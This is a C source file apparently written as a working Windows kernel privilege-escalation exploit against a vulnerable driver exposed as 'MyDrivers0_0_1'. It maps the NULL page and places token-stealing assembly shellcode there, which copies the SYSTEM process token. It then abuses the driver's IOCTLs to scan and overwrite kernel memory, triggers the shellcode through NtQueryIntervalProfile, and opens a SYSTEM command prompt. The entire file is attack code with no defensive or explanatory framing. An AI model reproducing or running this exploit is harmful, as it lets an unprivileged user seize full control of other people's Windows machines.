#include <windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <profileapi.h>
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
typedef NTSTATUS(WINAPI* NtQueryIntervalProfile)(
	IN ULONG ProfileSource,
	OUT PULONG Interval
	);
typedef NTSTATUS
(NTAPI* _NtAllocateVirtualMemory)(
	IN HANDLE               ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN ULONG                ZeroBits,
	IN OUT PULONG           RegionSize,
	IN ULONG                AllocationType,
	IN ULONG                Protect);
_NtAllocateVirtualMemory NtAllocateVirtualMemory;
VOID ShellCode()
{
	__asm
	{
		//int 3
		pop    edi
		pop    esi
		pop    ebx
		pushad
		mov eax, fs: [124h]
		mov eax, [eax + 050h]
		mov ecx, eax
		mov edx, 4

		findpid :
		mov eax, [eax + 0b8h]
		sub eax, 0b8h
		cmp[eax + 0b4h], edx
		jnz findpid

		mov edx, [eax + 0f8h]
		mov[ecx + 0f8h], edx
		popad
		ret
	}
}
HANDLE hDriver;
DWORD dw;
DWORD buf[0x1000]{};
int main() {

	hDriver = CreateFileA("\\\\.\\GLOBALROOT\\Device\\MyDrivers0_0_1", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Unable to get a handle on the device\n");
		getchar();
		return -1;
	}
	LPCSTR nt = "ntdll";
	HMODULE hntdll = GetModuleHandleA(nt);
	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress((HMODULE)hntdll, "NtAllocateVirtualMemory");

	if (!NtAllocateVirtualMemory) {
		printf("[-] Fail to resolve NtAllocateVirtualMemory(0x%X)\n", GetLastError());
		system("pause");
	}
	PVOID addr = (PVOID)0x1;
	DWORD size = 0x1000;
	if (!NT_SUCCESS(NtAllocateVirtualMemory(HANDLE(-1),
		&addr,
		0,
		&size,
		MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
		PAGE_EXECUTE_READWRITE)) || addr != 0)
	{
		printf("[-]GetLastError=%x", GetLastError());
		getchar();
		return -1;
	}
	RtlMoveMemory(0, &ShellCode, 0x100);


	
	for (size_t i = 0x3f00000; i < 0x4200000; i += 4)
	{
		buf[0] = i; 
		buf[2] = 4; 
		buf[3] = 1; 
		DeviceIoControl(hDriver, -1673502460, buf, 16, buf, 16, &dw, NULL);
		if (buf[0]==4 )
		{
			i += 4;
			buf[0] = i;
			buf[2] = 4;
			buf[3] = 1;
			DeviceIoControl(hDriver, -1673502460, buf, 16, buf, 16, &dw, NULL);
			if (buf[0] > 0x84000000&& buf[0] < 0x85000000)
			{
				i += 4;
				buf[0] = i;
				DeviceIoControl(hDriver, -1673502460, buf, 16, buf, 16, &dw, NULL);
				if (buf[0] > 0x84000000 && buf[0] < 0x85000000)
				{
					i += 4;
					buf[0] = i;
					DeviceIoControl(hDriver, -1673502460, buf, 16, buf, 16, &dw, NULL);
					if (buf[0] > 0x84000000 && buf[0] < 0x85000000)
					{
						i += 4;
						buf[0] = i;
						DeviceIoControl(hDriver, -1673502460, buf, 16, buf, 16, &dw, NULL);
						if (buf[0]==0)
						{
							buf[0] = i -= 12; 
							buf[3] = 1;  
							buf[4] = 0; 
							DeviceIoControl(hDriver, -1673486072, buf, 555, buf, 16, &dw, NULL);
						}					
					}
				}	
			}		
		}
	}
//	__debugbreak();

	DWORD Interval = 0;
	NtQueryIntervalProfile FNtQueryIntervalProfile = (NtQueryIntervalProfile)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryIntervalProfile");
	int NtStatus = FNtQueryIntervalProfile(
		2, // Source
		&Interval);// Interval
	if (NtStatus)
	{
		printf("NtQueryIntervalProfile failed! NtStatus=%.8X\n", NtStatus);
		getchar();
		return -1;
	}

	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	return 0;
}


